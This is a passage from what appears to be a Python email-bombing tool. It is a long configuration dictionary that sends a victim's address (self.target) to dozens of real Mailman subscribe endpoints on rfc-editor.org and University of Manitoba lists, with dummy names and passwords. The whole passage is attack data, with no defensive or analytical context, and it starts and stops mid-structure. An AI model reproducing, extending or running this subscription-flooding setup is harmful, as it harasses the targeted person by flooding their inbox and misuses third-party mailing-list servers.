                'token_url': 'https://www.rfc-editor.org/mailman/listinfo/c238',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IecKT': {
                'url': 'https://www.rfc-editor.org/mailman/subscribe/rfc-dist',
                'token_url': 'https://www.rfc-editor.org/mailman/listinfo/rfc-dist',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WcjtI': {
                'url': 'https://www.rfc-editor.org/mailman/subscribe/rfc-infrastructure',
                'token_url': 'https://www.rfc-editor.org/mailman/listinfo/rfc-infrastructure',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tRHtf': {
                'url': 'https://www.rfc-editor.org/mailman/subscribe/rfc-interest',
                'token_url': 'https://www.rfc-editor.org/mailman/listinfo/rfc-interest',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EDjhc': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/1919-conference',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/1919-conference',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Ueiir': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ach-cah',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ach-cah',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'INHmg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/adr-rlo',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/adr-rlo',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'dmHoK': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/agriculture-ffdc',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/agriculture-ffdc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IIaRp': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/agriculture-ffdcnews',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/agriculture-ffdcnews',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OzTnr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/agriculture-hns-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/agriculture-hns-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aZoPw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ahrm-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ahrm-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'YUVrR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ahs-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ahs-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FPkxA': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ahs-advisors',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ahs-advisors',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UcHpT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ahs-gradstudents',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ahs-gradstudents',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IYjMM': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/aiesec-ma',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/aiesec-ma',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'pkFmW': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/aiesec-ma-alumni',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/aiesec-ma-alumni',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uoBvw': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/aiesec-sn',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/aiesec-sn',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xFAjf': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/aims-mailing-list',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/aims-mailing-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rkvEu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/algonquian-l',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/algonquian-l',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xNCAz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/all-students-tuition-fees',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/all-students-tuition-fees',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'OYcVl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/amnesty-international-core',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/amnesty-international-core',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Axhvv': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ancillary-services',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ancillary-services',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TtmCL': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/antem-list',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/antem-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'MebXs': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/app-comp-math-seminar',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/app-comp-math-seminar',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VgdPZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/apple-list',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/apple-list',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ecEcb': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ask-finance-for-researchers',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ask-finance-for-researchers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GlbPF': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/aurora-finance-users',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/aurora-finance-users',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uIoGP': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/awasis-contacts-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/awasis-contacts-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uxOTI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bannatyne-it-support',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bannatyne-it-support',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qcvbt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bioinformatics-biostatistics-journal-club',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bioinformatics-biostatistics-journal-club',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NzHNT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/biostats-brainstorming',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/biostats-brainstorming',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'hvmDD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bison-media',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bison-media',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'TQWsm': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bme-adjunct',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bme-adjunct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'wRIJx': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bme-affiliate',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bme-affiliate',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GfelR': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bme-core',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bme-core',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'FoUfN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bme-graduate-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bme-graduate-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'IbPMV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/bme-members',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/bme-members',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'LtAPy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/card-coordinators',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/card-coordinators',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'GEbJi': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/centre-research',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/centre-research',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'gdDtl': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-adjunct',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-adjunct',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'RKJqs': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ZMTEz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-faculty',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-faculty',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jcqLD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-postdocs',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-postdocs',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'uckDt': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-ra',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-ra',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ykBtY': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-staff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-staff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'zDpGE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/ceos-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/ceos-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QjcvO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/chemical-weapons-convention-reporting',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/chemical-weapons-convention-reporting',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VgiwJ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/chlaabsc-2021',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/chlaabsc-2021',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tgEZg': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/chrr-initiative',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/chrr-initiative',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rEbjN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/chs-council',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/chs-council',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Eyxmk': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/chs-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/chs-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EXlOq': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/community-contacts',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/community-contacts',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UriOI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-academics',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-academics',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'XUCDJ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-all',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-all',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Omsom': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-all-students',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-all-students',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jBeQu': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-msc',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-msc',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'lfLCy': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-ot',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-ot',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'NSFfZ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-ot-2019',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-ot-2019',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'Mgldv': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-ot-2020',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-ot-2020',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'oqMhE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-ot-2021',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-ot-2021',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'aMuNS': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-ot-2022',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-ot-2022',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'qEFeG': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-ot-continuing',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-ot-continuing',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VgtuE': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-pt',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-pt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HLhCT': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-pt-2019',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-pt-2019',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'QzNCN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-pt-2020',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-pt-2020',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'VwnWC': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-pt-2021',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-pt-2021',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HDyUI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-pt-2022',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-pt-2022',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'WiLSD': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-researchers',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-researchers',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EkjiN': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-rt',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-rt',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'fcVDL': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-rt-2019',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-rt-2019',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'HETqV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-rt-2020',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-rt-2020',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'vijnQ': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-rt-2021',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-rt-2021',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ofJpz': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-rt-2022',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-rt-2022',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'ucKXm': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-rt-2023',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-rt-2023',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'xzOaa': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cors-supstaff',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cors-supstaff',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'rNZxr': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/cross-cultural-group',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/cross-cultural-group',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'knSCY': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/csc-all-members',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/csc-all-members',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UPYod': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/d2l-outages',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/d2l-outages',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'BWEzO': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/d2l-team',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/d2l-team',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'tOnwx': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dafoe-public-service',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dafoe-public-service',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'jEokI': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/data-science-platform-analytics-training',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/data-science-platform-analytics-training',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'UcYgV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni-hygiene2019',
                'token_url': 'http://lists.umanitoba.ca/mailman/listinfo/dental-alumni-hygiene2019',
                'key': 'received',
                'data': {
                    'email': self.target,
                    'fullname': 'a',
                    'pw': 'a',
                    'pw-conf': 'a',
                    'digest': '1',
                    'email-button': 'Subscribe'
                },
            },
            'EpLRV': {
                'url': 'http://lists.umanitoba.ca/mailman/subscribe/dental-alumni2014',
